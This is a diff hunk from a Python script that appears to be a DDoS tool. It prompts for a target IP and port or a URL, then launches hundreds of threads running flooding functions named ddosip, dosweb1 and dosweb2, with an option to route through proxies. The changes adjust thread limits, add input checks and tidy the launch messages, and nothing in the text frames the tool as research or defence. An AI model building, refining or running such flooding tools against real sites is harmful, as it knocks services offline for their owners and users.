@@ -87,43 +87,46 @@ if vibor == 1:
     port = int(input("Port: "))
 
     try:
-        threads = int(input("Threads[max 1000]: "))
+        threads = int(input("Threads[max 500]: "))
     except ValueError:
         exit(colorama.Fore.RED + "Threads count is incorrect!")
 
-    if threads > 1000 or threads == 0:
+    if threads > 500 or threads == 0:
         exit(colorama.Fore.RED + "Incorrect value")
 
+    print(colorama.Fore.YELLOW + "Starting threads")
     for i in range(0, threads):
-        ipddos = threading.Thread(target=ddosip)
-        ipddos.start()
-        print(colorama.Fore.GREEN + str(i + 1) + " thread started!")
+        threading.Thread(target=ddosip).start()
+    print(colorama.Fore.GREEN + "All threads are running")
 else:
     url = input("URL: ")
 
     try:
-        threads = int(input("Threads: "))
+        threads = int(input("Threads[max 1000]: "))
     except ValueError:
         exit(colorama.Fore.RED + "Threads count is incorrect!")
+
+    if threads > 1000:
+        exit(colorama.Fore.RED + "Incorrect value")
 
     if threads == 0:
         exit(colorama.Fore.RED + "Threads count is incorrect!")
 
     if not url.__contains__("http"):
-        exit("URL doesnt contains http or https!")
+        exit(colorama.Fore.RED + "URL doesnt contains http or https!")
 
     if not url.__contains__("."):
-        exit("Invalid domain")
+        exit(colorama.Fore.RED + "Invalid domain")
 
     proxyuseage = int(input("Use a proxy?[1-yes; 2-no]: "))
-
+    
+    print(colorama.Fore.YELLOW + "Starting threads")
     if proxyuseage == 1:
         for i in range(0, threads):
-            thr = threading.Thread(target=dosweb1, args=(url,))
-            thr.start()
+            threading.Thread(target=dosweb1, args=(url,)).start()
             print(colorama.Fore.GREEN + str(i + 1) + " thread started!")
     else:
         for i in range(0, threads):
-            thr2 = threading.Thread(target=dosweb2, args=(url,))
-            thr2.start()
+            threading.Thread(target=dosweb2, args=(url,)).start()
             print(colorama.Fore.GREEN + str(i + 1) + " thread started!")
+    print(colorama.Fore.GREEN + "All threads are running")
